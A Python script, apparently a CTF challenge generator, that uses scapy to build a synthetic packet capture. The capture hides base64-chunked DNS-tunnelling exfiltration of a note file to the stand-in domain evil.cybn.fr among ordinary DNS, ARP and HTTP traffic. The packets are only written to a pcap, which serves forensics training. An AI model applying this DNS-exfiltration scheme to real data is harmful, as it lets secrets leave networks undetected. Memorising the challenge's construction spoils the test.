"""Génère la capture réseau du challenge Je demande pour un ami."""

import base64
import random
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlsplit

from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, IP, TCP, UDP, wrpcap


CLIENT_IP = "10.24.8.42"
DNS_IP = "10.24.8.53"
CLIENT_MAC = "02:42:0a:18:08:2a"
DNS_MAC = "02:42:0a:18:08:35"
ROUTER_MAC = "02:42:0a:18:08:01"
EXFIL_DOMAIN = "evil.cybn.fr"
EXFIL_CHUNK_SIZE = 32
NOTE = Path(__file__).with_name("note.txt")
OUTPUT = Path(__file__).parent.parent / "public" / "capture.pcap"
MAX_RESPONSE_BYTES = 8 * 1024 * 1024
USER_AGENT = "Mozilla/5.0"
HTTP_URLS = {
    4: ("https://www.rfc-editor.org/info/rfc1035/", "text/html"),
    14: ("https://storage.letudiant.fr/mediatheque/educpros/3/8/77138-f-meunier-efrei-160x160.jpg", "image/jpeg"),
    24: ("https://c.tenor.com/xN2evw7BCIAAAAAd/tenor.gif", "image/gif"),
}

# Trente résolutions ordinaires. Les trois hôtes HTTP sont aux positions 4, 14 et 24.
NORMAL_DNS = [
    ("connectivitycheck.gstatic.com", "142.250.74.35"),
    ("api.github.com", "140.82.112.6"),
    ("fonts.googleapis.com", "142.250.74.10"),
    ("www.wikipedia.org", "208.80.154.224"),
    ("www.rfc-editor.org", "128.9.128.17"),
    ("cdn.jsdelivr.net", "104.16.85.20"),
    ("www.mozilla.org", "44.236.72.93"),
    ("login.microsoftonline.com", "20.190.160.1"),
    ("pypi.org", "151.101.0.223"),
    ("www.python.org", "151.101.0.223"),
    ("static.cloudflareinsights.com", "104.16.123.96"),
    ("www.debian.org", "151.101.2.132"),
    ("docs.docker.com", "13.32.151.100"),
    ("www.google.com", "142.250.74.68"),
    ("storage.letudiant.fr", "104.21.57.91"),
    ("www.efrei.fr", "104.21.67.153"),
    ("www.ietf.org", "104.16.45.99"),
    ("www.wireshark.org", "104.26.3.240"),
    ("github.com", "140.82.112.3"),
    ("raw.githubusercontent.com", "185.199.108.133"),
    ("www.stackoverflow.com", "104.18.32.7"),
    ("www.gnu.org", "209.51.188.116"),
    ("download.docker.com", "13.32.151.80"),
    ("www.kali.org", "104.18.5.159"),
    ("c.tenor.com", "142.250.75.78"),
    ("www.reddit.com", "151.101.1.140"),
    ("www.openstreetmap.org", "146.75.118.132"),
    ("www.kernel.org", "139.178.84.217"),
    ("www.archive.org", "207.241.237.3"),
    ("www.rust-lang.org", "13.35.93.120"),
]

ARP_TARGETS = [DNS_IP, "10.24.8.1", "10.24.8.12", "10.24.8.16", "10.24.8.19",
               "10.24.8.22", "10.24.8.31", "10.24.8.60", "10.24.8.77", "10.24.8.90"]
def fetch_resource(url, expected_type):
    """Télécharge la ressource entière ; une erreur empêche la création du PCAP."""
    request = urllib.request.Request(url, headers={
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Accept-Encoding": "identity",
    })
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            if response.geturl() != url:
                raise ValueError(f"redirection vers {response.geturl()}")
            if response.status != 200:
                raise ValueError(f"statut HTTP {response.status}")
            content_type = response.headers.get_content_type()
            if content_type != expected_type:
                raise ValueError(f"type {content_type}, attendu {expected_type}")
            body = response.read(MAX_RESPONSE_BYTES + 1)
    except (OSError, ValueError) as error:
        raise SystemExit(f"Téléchargement impossible pour {url} : {error}") from error

    if not body or len(body) > MAX_RESPONSE_BYTES:
        raise SystemExit(f"Réponse vide ou supérieure à 8 Mio : {url}")
    if expected_type == "image/jpeg" and not body.startswith(b"\xff\xd8\xff"):
        raise SystemExit(f"Le JPEG téléchargé est invalide : {url}")
    if expected_type == "image/gif" and not body.startswith((b"GIF87a", b"GIF89a")):
        raise SystemExit(f"Le GIF téléchargé est invalide : {url}")
    print(f"Téléchargé : {url} ({len(body)} octets)")
    return content_type, body


def http_exchange(host, path, server_ip, content_type, body, rng):
    """Construit une connexion TCP avec GET, réponse et fermeture des deux côtés."""
    sport = rng.randrange(40000, 60000)
    client_seq = rng.randrange(1_000_000, 2_000_000)
    server_seq = rng.randrange(3_000_000, 4_000_000)
    request = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
               f"User-Agent: {USER_AGENT}\r\nAccept: */*\r\n"
               "Accept-Encoding: identity\r\nConnection: close\r\n\r\n").encode()
    response = ("HTTP/1.1 200 OK\r\n"
                f"Content-Type: {content_type}\r\nContent-Length: {len(body)}\r\n"
                "Connection: close\r\n\r\n").encode() + body

    def packet(from_client, flags, seq, ack=0, data=b""):
        src_ip, dst_ip = (CLIENT_IP, server_ip) if from_client else (server_ip, CLIENT_IP)
        src_mac, dst_mac = (CLIENT_MAC, ROUTER_MAC) if from_client else (ROUTER_MAC, CLIENT_MAC)
        src_port, dst_port = (sport, 80) if from_client else (80, sport)
        return (Ether(src=src_mac, dst=dst_mac) / IP(src=src_ip, dst=dst_ip)
                / TCP(sport=src_port, dport=dst_port, flags=flags, seq=seq, ack=ack)
                / data)

    yield packet(True, "S", client_seq)
    yield packet(False, "SA", server_seq, client_seq + 1)
    yield packet(True, "A", client_seq + 1, server_seq + 1)
    yield packet(True, "PA", client_seq + 1, server_seq + 1, request)
    client_end = client_seq + 1 + len(request)
    yield packet(False, "A", server_seq + 1, client_end)

    server_end = server_seq + 1
    for offset in range(0, len(response), 1200):
        chunk = response[offset:offset + 1200]
        yield packet(False, "PA", server_end, client_end, chunk)
        server_end += len(chunk)
        yield packet(True, "A", client_end, server_end)

    yield packet(False, "FA", server_end, client_end)
    yield packet(True, "FA", client_end, server_end + 1)
    yield packet(False, "A", server_end + 1, client_end + 1)


def dns_exchange(name, answer, rng):
    """Construit une requête A et sa réponse avec le même ID et port source."""
    query_id = rng.randrange(1, 65536)
    sport = rng.randrange(40000, 60000)
    question = DNSQR(qname=name, qtype="A")
    query = DNS(id=query_id, rd=1, qd=question)
    reply = DNS(id=query_id, qr=1, rd=1, ra=1, qd=question, ancount=1,
                an=DNSRR(rrname=name, type="A", ttl=300, rdata=answer))
    yield (Ether(src=CLIENT_MAC, dst=DNS_MAC) / IP(src=CLIENT_IP, dst=DNS_IP)
           / UDP(sport=sport, dport=53) / query)
    yield (Ether(src=DNS_MAC, dst=CLIENT_MAC) / IP(src=DNS_IP, dst=CLIENT_IP)
           / UDP(sport=53, dport=sport) / reply)


def arp_exchange(index, target_ip):
    target_mac = DNS_MAC if index == 0 else f"02:42:0a:18:08:{index:02x}"
    yield (Ether(src=CLIENT_MAC, dst="ff:ff:ff:ff:ff:ff")
           / ARP(op=1, hwsrc=CLIENT_MAC, psrc=CLIENT_IP, pdst=target_ip))
    yield (Ether(src=target_mac, dst=CLIENT_MAC)
           / ARP(op=2, hwsrc=target_mac, psrc=target_ip,
                 hwdst=CLIENT_MAC, pdst=CLIENT_IP))


def main():
    if not 1 <= EXFIL_CHUNK_SIZE <= 63:
        raise SystemExit("EXFIL_CHUNK_SIZE doit être compris entre 1 et 63.")
    note = NOTE.read_bytes()
    if not note:
        raise SystemExit(f"Le fichier à exfiltrer est vide : {NOTE}")
    encoded = base64.urlsafe_b64encode(note).decode("ascii").rstrip("=")
    chunks = [encoded[i:i + EXFIL_CHUNK_SIZE]
              for i in range(0, len(encoded), EXFIL_CHUNK_SIZE)]
    if len(chunks) > 10_000:
        raise SystemExit("Plus de 10 000 paquets d'exfiltration : index sur 4 chiffres insuffisant.")

    rng = random.Random(2026)
    packets = []
    timestamp = datetime(2026, 10, 17, 20, 32, tzinfo=timezone.utc).timestamp()

    def add(group):
        nonlocal timestamp
        for packet in group:
            packet.time = timestamp
            packets.append(packet)
            timestamp += rng.uniform(0.025, 0.12)
        timestamp += rng.uniform(0.3, 1.2)

    http = {}
    for index, (url, expected_type) in HTTP_URLS.items():
        parsed = urlsplit(url)
        content_type, body = fetch_resource(url, expected_type)
        http[index] = (parsed.hostname, parsed.path, content_type, body)
    assert len(NORMAL_DNS) == 30
    arp_index = 0
    exfil_index = 0

    for index, (domain, address) in enumerate(NORMAL_DNS):
        if index % 3 == 0:
            add(arp_exchange(arp_index, ARP_TARGETS[arp_index]))
            arp_index += 1

        add(dns_exchange(domain, address, rng))

        if index in http:
            host, path, content_type, body = http[index]
            assert host == domain
            add(http_exchange(host, path, address, content_type, body, rng))

        while exfil_index < (index + 1) * len(chunks) // len(NORMAL_DNS):
            name = f"{exfil_index:04d}.{chunks[exfil_index]}.{EXFIL_DOMAIN}"
            add(dns_exchange(name, "203.0.113.77", rng))
            exfil_index += 1

    OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    wrpcap(str(OUTPUT), packets)
    print(f"{OUTPUT} : {len(packets)} paquets, 30 DNS normaux, "
          f"{len(chunks)} DNS d'exfiltration, 20 ARP, 3 échanges HTTP")


if __name__ == "__main__":
    main()
